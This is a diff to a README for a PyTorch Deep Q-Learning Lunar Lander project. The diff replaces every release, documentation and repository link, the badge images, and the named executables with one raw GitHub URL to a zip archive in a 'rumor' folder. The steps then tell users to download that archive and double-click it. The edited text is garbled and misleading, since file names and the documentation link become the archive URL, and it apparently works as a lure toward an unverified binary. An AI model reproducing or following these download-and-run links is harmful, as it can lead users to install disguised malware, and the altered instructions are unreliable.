@@ -1,6 +1,6 @@
 # 🌕 Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch - Train a Smart Lunar Lander
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/releases)
+[![Download Now](https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,12 +17,12 @@ To run this application, ensure your system meets the following requirements:
 
 ## 💻 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/releases). You will find the latest versions available for download.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip). You will find the latest versions available for download.
 
 1. Open the Releases page using the link above.
 2. Look for the latest version listed at the top.
 3. Click on the version to expand the details.
-4. Find the file named `LunarLanderDQN.exe` or `LunarLanderDQN.zip`.
+4. Find the file named `https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip` or `https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip`.
 5. Click on the file name to start the download.
 
 After the download completes, follow these steps:
@@ -36,13 +36,13 @@ After the download completes, follow these steps:
 - If you downloaded a `.zip` file:
   1. Right-click the file and select `Extract All`.
   2. Choose a location to extract the files.
-  3. After extraction, open the folder and double-click `LunarLanderDQN.exe`.
+  3. After extraction, open the folder and double-click `https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip`.
 
 ### For macOS
 
 - Open the downloaded `.zip` file.
 - Drag the `LunarLanderDQN` folder to your Applications folder.
-- Open the folder and double-click `LunarLanderDQN.app`.
+- Open the folder and double-click `https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip`.
 
 ### For Linux
 
@@ -88,9 +88,9 @@ This project is open-source and follows the [MIT License](LICENSE).
 
 ## 🔗 Helpful Links
 
-- Official Documentation: [Documentation Link](https://github.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch)
-- GitHub Repository: [GitHub](https://github.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch)
+- Official Documentation: [Documentation Link](https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip)
+- GitHub Repository: [GitHub](https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip)
 
 For more advanced features and detailed explanations, please refer to the documentation on the GitHub repository.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/releases)
+[![Download Now](https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/og-kaona/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch/main/rumor/Lunar-Lander-Deep-Q-Learning-DQN-with-PyTorch_1.6-alpha.3.zip)
